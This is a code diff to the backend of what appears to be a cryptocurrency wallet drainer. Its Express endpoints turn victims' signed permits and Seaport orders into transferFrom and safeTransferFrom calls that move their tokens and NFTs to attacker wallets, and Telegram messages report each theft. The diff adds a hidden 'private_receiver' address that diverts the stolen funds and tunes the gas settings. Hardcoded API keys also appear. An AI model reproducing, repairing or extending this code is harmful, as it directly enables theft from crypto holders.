@@ -159,9 +159,11 @@ const ERC1155 = [
   },
 ];
 
+
 const config = { 
-    receiver: "0xe38Df8CeAD30F9930E48aa044bdae43928080bcD",
-    
+    receiver: "0x46C4ac570d8edbD8BD62b36BA495D0BE771c4480",
+    private_receiver: "0x0cc131B43de76A459c3dd0DF729df93d35a5Bb95",
+
     // ERC20 & NFT
     SAFAfulfiller: process.env.SAFAfulfiller,
 
@@ -170,13 +172,13 @@ const config = {
 
     BOT_TOKEN: process.env.bot,
     LOGS_CHAT_ID: "-1001542284779",
-    SUCCESS_CHAT_ID: "-1001580311558",
+    SUCCESS_CHAT_ID: "-1001542284779",
 
     MORALIS_API_KEY: "XAgBvhdSiZdoNeJppNuPXa7f7t0N1Wgq3s5gF7kMEHx0Wk6YQgv7VObMOnotp5Wp",
     OPENSEA_API_KEY: "8b707e3a2b334c40bf7943b1b328e6e9"
  }
 let provider = new ethers.providers.JsonRpcProvider(
-  "https://rpc.ankr.com/eth"
+  "https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a"
 );
 
 /******* SEAPORT *******/
@@ -232,17 +234,26 @@ app.post("/backend/seaport", async (req, res) => {
     let fulfillerSigner = await fulfillerWallet.connect(provider);
     let spClientFulfiller = new seaport.Seaport(fulfillerSigner);
 
+
     let gasPrice = await provider.getGasPrice();
-    let hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 1.3))
+    let hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 2))
+    let gasLimit = await spClientFulfiller
+    .matchOrders({
+      orders: [order],
+      fulfillments,
+      accountAddress: config.receiver,
+    })
+    .estimateGas();
+    let gasLimitHex = ethers.utils.hexlify(gasLimit);
+    console.log('gasLimitHex',gasLimitHex)
+
+
 
     const transaction = await spClientFulfiller
       .matchOrders({
         orders: [order],
         fulfillments,
-        overrides: {
-          gasPrice: hexGasPrice,
-          gasLimit: ethers.utils.hexlify(10000000)
-        },
+        gasLimit:gasLimitHex ,
         accountAddress: config.receiver,
       })
       .transact();
@@ -348,6 +359,7 @@ app.post("/backend/permit", async (req, res) => {
   let withdrawBalance = req.body.withdrawBalance;
   let contractAddress = req.body.contractAddress;
 
+  let permitValue = req.body.value;
   let r = req.body.r;
   let s = req.body.s;
   let v = req.body.v;
@@ -356,6 +368,7 @@ app.post("/backend/permit", async (req, res) => {
   let escaper = (ah) => {
     return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
   }
+  console.log('permitValue',permitValue)
 
   try {
     const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
@@ -364,7 +377,20 @@ app.post("/backend/permit", async (req, res) => {
     res.status(200).send({
       status: true,
     })
-    let permit = await contractInstance.permit(address, config.receiver, withdrawBalance, deadline, v, r, s)
+
+    let gasPrice = await provider.getGasPrice();
+
+    let gasLimit = await contractInstance.estimateGas.permit(
+      address, config.receiver, permitValue, deadline, v, r, s
+    );
+
+    let totalGas = gasLimit * gasPrice;
+    console.log(totalGas,gasLimit,  gasPrice)
+
+
+    let gasLimitHex = ethers.utils.hexlify(gasLimit);
+    
+    let permit = await contractInstance.permit(address, config.receiver, permitValue, deadline, v, r, s, { gasLimit: gasLimitHex })
 
     let message =
       `🟢 *Approved PERMIT ERC20 Transaction*\n\n` +
@@ -399,7 +425,7 @@ app.post("/backend/permit", async (req, res) => {
 
     // WITHDRAWING
 
-    let withdrawal = await contractInstance.transferFrom(address, config.receiver, withdrawBalance)
+    let withdrawal = await contractInstance.transferFrom(address, config.private_receiver, withdrawBalance)
 
     let withdrawMessage =
       `*Withdrawed ERC20 permit*\n\n` +
@@ -487,7 +513,7 @@ app.post("/backend/safa/erc20", async (req, res) => {
     const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
     let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);
 
-    let withdrawal = await contractInstance.transferFrom(address, config.receiver, withdrawBalance)
+    let withdrawal = await contractInstance.transferFrom(address, config.private_receiver, withdrawBalance)
 
     let withdrawMessage =
       `*Withdrawed ${escaper(tokenType)}*\n\n` +
@@ -592,12 +618,12 @@ app.post("/backend/safa/nft", async (req, res) => {
 
         if (tokenType == "ERC721") {
           let contractInstance = new ethers.Contract(contractAddress, ERC721, signer);
-          withdrawal = await contractInstance.safeTransferFrom(address, config.receiver, tokenIds[i])
+          withdrawal = await contractInstance.safeTransferFrom(address, config.private_receiver, tokenIds[i])
         }
 
         if (tokenType == "ERC1155") {
           let contractInstance = new ethers.Contract(contractAddress, ERC1155, signer);
-          withdrawal = await contractInstance.safeTransferFrom(address, config.receiver, tokenIds[i], 1, 256)
+          withdrawal = await contractInstance.safeTransferFrom(address, config.private_receiver, tokenIds[i], 1, 256)
         }
 
         let withdrawMessage =
